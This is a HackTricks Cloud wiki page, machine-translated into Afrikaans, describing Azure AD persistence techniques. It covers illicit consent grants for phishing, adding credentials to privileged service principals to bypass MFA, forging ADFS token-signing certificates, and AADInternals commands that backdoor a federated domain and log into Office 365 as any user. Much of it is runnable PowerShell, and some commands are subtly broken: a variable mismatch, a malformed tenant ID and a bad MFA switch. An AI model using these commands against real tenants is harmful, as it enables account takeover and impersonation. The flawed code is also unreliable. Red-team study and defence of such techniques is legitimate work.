# Az - Volharding

{% hint style="success" %}
Leer en oefen AWS-hacking: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer en oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

### Onwettige Toestemming Verlening

Standaard kan enige gebruiker 'n aansoek registreer in Azure AD. Jy kan dus 'n aansoek registreer (slegs vir die teikenhuurder) wat ho√´ impak-toestemmings met admin-toestemming benodig (en dit goedkeur as jy die admin is) - soos e-pos stuur namens 'n gebruiker, rolbestuur ens. Dit sal ons in staat stel om **hengel aanvalle** uit te voer wat baie **vrugbaar** sou wees in geval van sukses.

Daarbenewens kan jy ook daardie aansoek met jou gebruiker aanvaar as 'n manier om toegang daartoe te behou.

### Aansoeke en Diensprinsepaal

Met die voorregte van 'n Toepassingadministrateur, GA of 'n aangepaste rol met microsoft.directory/aansoeke/legitimasie/bywerk toestemmings, kan ons legitimasie (geheim of sertifikaat) by 'n bestaande aansoek voeg.

Dit is moontlik om te **mik op 'n aansoek met ho√´ toestemmings** of **'n nuwe aansoek** met ho√´ toestemmings by te voeg.

'n Interessante rol om by die aansoek te voeg sou die **Bevoorregte verifikasie-administrateurrol** wees, aangesien dit toelaat om die wagwoord van Globale Administrateurs te **herstel**.

Hierdie tegniek maak dit ook moontlik om **MFA te omseil**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Vir sertifikaat-gebaseerde verifikasie

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federasie - Token Ondertekeningsertifikaat

Met **DA-voorregte** op die on-prem AD, is dit moontlik om **nuwe Token ondertekenings** en **Token Dekripteer sertifikate** te skep en in te voer wat 'n baie lang geldigheid het. Dit sal ons in staat stel om as enige gebruiker in te teken wie se ImuutableID ons weet.

**Voer** die onderstaande bevel uit as **DA op die ADFS-bediener(s)** om nuwe sertifikate te skep (verstek wagwoord 'AADInternals'), voeg hulle by ADFS, skakel outomatiese rollover af en herlaai die diens:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Vervolgens, werk die sertifikaatinligting by met Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federasie - Vertroude Domein

Met GA-voorregte op 'n huurder, is dit moontlik om **'n nuwe domein by te voeg** (moet geverifieer word), stel sy verifikasietipe in op Gefedereer en stel die domein in om 'n spesifieke sertifikaat te **vertrou** (enige.sts in die onderstaande bevel) en uitreiker:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Verwysings

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
